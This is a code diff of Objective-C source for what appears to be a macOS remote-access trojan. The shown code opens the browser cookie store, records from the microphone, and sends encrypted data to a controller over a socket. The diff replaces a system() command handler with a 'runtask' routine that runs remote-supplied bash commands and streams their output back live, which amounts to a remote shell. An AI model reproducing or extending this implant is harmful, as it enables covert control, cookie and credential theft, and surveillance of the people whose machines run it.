@@ -6,9 +6,10 @@
 @synthesize soundRecorder, fileManager;
 
 BOOL micinuse;
+BOOL systaskrunning = false;
 FILE *cookieJar;
 char lastBytes[64];
-    
+
 -(id)init {
     fileManager = [[NSFileManager alloc] init];
     return self;
@@ -31,7 +32,7 @@ char lastBytes[64];
     return [path substringToIndex:[path length] - 1];
 }
 
-    
+
 char* parseBinary(int* searchChars,int sizeOfSearch) {
     NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
     cookieJar = fopen([cookieJarPath UTF8String], "rb+");
@@ -88,7 +89,11 @@ int sockfd;
 
 -(void)sendString:(NSString *)string {
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
-//    system([[NSString stringWithFormat:@"echo 'sending:->%@<-' >> /tmp/esplog",finalstr] UTF8String]);
+    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
+}
+
+-(void)liveSendString:(NSString *)string {
+    NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_liveterminator];
     write (sockfd, [finalstr UTF8String], finalstr.length + 11);
 }
 
@@ -554,15 +559,6 @@ int sockfd;
 
 //MARK: Misc
 
--(void)executeCMD:(NSArray *)args {
-    if (args.count == 1) {
-        [self sendString:@"Usage: exec say hi; touch file"];
-        return;
-    }
-    system([[self forgetFirst:args] UTF8String]);
-    [self sendString:@""];
-}
-
 -(void)idleTime {
     //returns number of seconds
     int64_t idlesecs = -1;
@@ -700,6 +696,41 @@ int sockfd;
     NSURL *url = [NSURL URLWithString:cmdarray[1]];
     [[NSWorkspace sharedWorkspace] openURL:url];
     [self blank];
+}
+
+-(void)runtask:(NSString *)cmd {
+    if ([cmd  isEqual: @"endtask"] && systaskrunning) {
+        [_systask terminate];
+        return;
+    }
+    //http://stackoverflow.com/questions/23937690/getting-process-output-using-nstask-on-the-go
+    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
+        systaskrunning = true;
+        _systask = [[NSTask alloc] init];
+        [_systask setLaunchPath:@"/bin/bash"];
+        [_systask setArguments:@[ @"-c", cmd]];
+        
+        NSPipe *stdoutPipe = [NSPipe pipe];
+        [_systask setStandardOutput:stdoutPipe];
+        
+        NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
+        [stdoutHandle waitForDataInBackgroundAndNotify];
+        id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
+                                                                        object:stdoutHandle queue:nil
+                                                                    usingBlock:^(NSNotification *note)
+                       {
+                           NSData *dataRead = [stdoutHandle availableData];
+                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
+                           [self liveSendString:newOutput];
+                           [stdoutHandle waitForDataInBackgroundAndNotify];
+                       }];
+        
+        [_systask launch];
+        [_systask waitUntilExit];
+        [[NSNotificationCenter defaultCenter] removeObserver:observer];
+        systaskrunning = false;
+        [self blank];
+    });
 }
 
 -(NSData *)GetMACAddress {
